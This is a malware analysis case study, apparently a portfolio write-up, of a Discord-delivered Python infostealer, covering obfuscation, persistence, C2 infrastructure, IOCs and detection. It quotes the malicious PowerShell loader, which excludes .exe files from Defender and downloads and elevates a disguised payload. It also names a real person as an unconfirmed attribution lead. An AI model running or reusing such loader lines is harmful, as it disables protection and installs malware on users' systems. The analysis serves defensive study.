
# 🧪 Malware Analysis Case Study: Discord-Delivered Infostealer

---

## 🔍 Executive Summary
 I investigated a Discord-distributed malware campaign delivering a Python-based infostealer disguised as `.zip` files. The malware employs Base85 + XOR obfuscation, multiple persistence mechanisms, and a WebSocket-based C2 infrastructure. I performed both static and dynamic analysis to uncover the infection chain, payload behavior, and exfiltration methods.

---

## 🧾 Threat Overview

| Category         | Details                                  |
|------------------|-------------------------------------------|
| Malware Type     | Python-based Infostealer                 |
| Entry Point      | Discord server promotion                 |
| Obfuscation      | Base85 + XOR                             |
| Persistence      | Scheduled tasks                          |
| Exfil Method     | Discord Webhooks & WebSocket C2          |
| Primary C2       | ws://195.211.190.107:8767                |
| Tools Used       | pyinstxtractor, pycdc, HxD, Wireshark    |
## 🧩 1. Initial Vector

- **Delivery Method**: Discord server promoted via [discordservers.com](https://discordservers.com/server/1354134816194564147)
- **File Name**: `Launcher.exe`
- **Behavior**:
  - Hosted on Discord CDN
  - Attempts to evade detection of payloads by using a `.zip` extension with an executable file (confirmed by `MZ` header in HxD)![[image (9).png]]
  - Downloads additional payloads via obfuscated PowerShell script

---


## 🎯 Advertised Discord Server

[https://discordservers.com/server/135413481619456414](https://discordservers.com/server/1354134816194564147)

---

### ❌ Fake user:

![[image (2).png]]
### ✅ Real user:

![[image (3).png]]
---

## 📦 2. Payload Chain

The PowerShell script downloads 5 payloads from GitHub:
## 🧪 Triage

Initial sample – **Launcher.exe from Discord**  
[Sandbox Link](https://tria.ge/250401-jxxhrsyly6/behavioral1)

### Payloads:
- Payload 1: https://tria.ge/250401-l4tfsszkz9/behavioral1
- Payload 2: https://tria.ge/250401-l8p9yaxvc1/behavioral1
- Payload 3: https://tria.ge/250401-l8yajszlt6/behavioral1
- Payload 4: https://tria.ge/250401-l7htgazls9/behavioral1
- Payload 5: https://tria.ge/250401-l5p5rsxvbz/behavioral1

Grabbed from:  
https://idefasoft.com/pastes/yUmTjqdnCjrD/raw/

---

> ⚠️⚠️ WARNING: This PowerShell is **malicious**. Do not run it. ⚠️⚠️  
> For **educational purposes only** – shown here as part of analysis.

```powershell
Set-MpPreference -ExclusionExtension *.exe
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Lapresse-Hugo/MalwareDatabase/refs/heads/master/Unknown/1.zip" -OutFile "$Env:LocalAppData\Updates\firefox_updater.exe"; Start-Process -Verb RunAs -Filepath "$Env:LocalAppData\Updates\firefox_updater.exe"
# continues with all 5 payloads and sets up scheduled tasks
```

---

> Despite `.zip` extension, all are PyInstaller-packed `.exe` files

### Payload Analysis (via Detect It Easy):
- **Payloads 1, 3, 5** → PyInstaller executables
-
![[image.webp]]

- Show signs of being infostealers (strings: `master_key`, `passwords`, `webhook_url`, `ImageGrab`, etc.)

---

## 🧬 3. Obfuscation Techniques

### 🔐 Encoding Technique
- Obfuscation: Base85 encoding + XOR cipher with hardcoded keys
- Decoded using a custom Python function:

Below is the actual decoding function and two real-world examples extracted from the malware:

  

```python

import base64


def decode_b85_xor(encoded: bytes, key: bytes) -> str:

    decoded_bytes = base64.b85decode(encoded)

    xored = bytes([b ^ key[i % len(key)] for i, b in enumerate(decoded_bytes)])

    return xored.decode(errors="replace")

  
# Example 1: pastebin.com link

encoded_1 = b'Czze{5la`ZaouY*vOZ~KVULFHO#@l?F8C@Il@dxv3j'

key_1 = bytes([

    79, 236, 233, 131, 98, 113, 56, 128,

    1, 188, 24, 65, 215, 92, 0, 10

])


print(decode_b85_xor(encoded_1, key_1))

# Output: https://pastebin.com/raw/D2WBNJMD

  
# Example 2: secondary paste URL

encoded_2 = b'lew$(9^1~Ipe;%akdkQFkK?@S0M3!nx;;u6-qS+YuB(~+Uev0Bxn^AphRy'

key_2 = bytes([

    251, 205, 223, 132, 109, 225, 225, 177,

    201, 73, 47, 106, 241, 225, 7, 190

])

  
print(decode_b85_xor(encoded_2, key_2))

# Output: https://idefasoft.com/pastes/2EiUfFx35K3p/raw/

```



### 🔓 Decoded Payload URLs
- `https://pastebin.com/raw/D2WBNJMD`
- `https://idefasoft.com/pastes/2EiUfFx35K3p/raw/`

Both returned:
```json
{ "url": "ws://195.211.190.107:8767" }
```

---

## ⚙️ 4. Persistence & Behavior

- **Creates Scheduled Tasks**:
  - `EdgeUpdater`, `SystemUpdater`, `WindowsUpdater`
- **Survives Reboot**
- **Screenshot Capabilities**
- **Credential Access (likely Chrome/Edge)**
- **Exfiltrates via Discord Webhooks or WebSocket C2**


---

## 🌐 5. Network Infrastructure

### 🧭 C2 Server
- **WebSocket URL**: `ws://195.211.190.107:8767`
- **Resolved Host**: `ryoko.questnerd.net`

### 🌍 Geo Info (via ipinfo.io)
```
IP: 195.211.190.107
Location: Kerkrade, Limburg, NL
Org: AS214943 Railnet LLC
```

---

## 🕵️ 6. Attribution Clues

- Hosted on GitHub fork of [`Endermanch/MalwareDatabase`](https://github.com/Endermanch/MalwareDatabase)
- Fork created by: [Lapresse-Hugo](https://github.com/Lapresse-Hugo)
- Linked to: [Hugo Lapresse](https://www.linkedin.com/in/hugo-lapresse/)
  - Claims affiliation with: [HypeProtect](https://hypeprotect.fr)

⚠️ **Attribution not confirmed** – could be impersonation or compromised GitHub.

---

## 📎 7. Indicators of Compromise (IOCs)

| Type         | Value                                              |
| ------------ | -------------------------------------------------- |
| URL          | `https://pastebin.com/raw/D2WBNJMD`                |
| URL          | `https://idefasoft.com/pastes/2EiUfFx35K3p/raw/`   |
| GitHub       | `https://github.com/Lapresse-Hugo/MalwareDatabase` |
| WebSocket C2 | `ws://195.211.190.107:8767`                        |
| IP           | `195.211.190.107`                                  |

---

## 🛡️ 8. Detection & Mitigation

- 🔍 Detect `.zip` files with `MZ` headers (PE disguised)
- 🛑 Block outbound WebSocket traffic to untrusted IPs
- 🎯 Alert on PowerShell creating scheduled tasks

---

## 🧰 9. Tooling & Methodology

- **Dynamic Analysis**: [tria.ge](https://tria.ge), Wireshark
- **Static Analysis**: HxD, Detect It Easy
- **Unpacking**: pyinstxtractor
- **Decompilation**: pycdc
- **Custom Tools**: Python deobfuscator (Base85 + XOR)

---

## ✅ Conclusion

This case study shows how an attacker combined social engineering (Discord), public infrastructure (GitHub, Pastebin), and lightweight Python obfuscation to deliver a persistent infostealer. My investigation involved reverse engineering, behavior analysis, and decoding layered obfuscation, demonstrating key skills in malware triage, Python reversing, and threat hunting.

## 🧠 What I Learned

- How to reverse-engineer PyInstaller-packed Python malware
- How Base85 + XOR can be used for lightweight obfuscation
- Practical use of `pyinstxtractor`, `pycdc`, and sandboxing for real-world analysis

---

## 📩 Final Notes & Contact

If you have feedback, or want to collaborate, feel free to reach out.

> 💼 Open to roles in threat research, SOC, detection engineering, or reverse engineering.

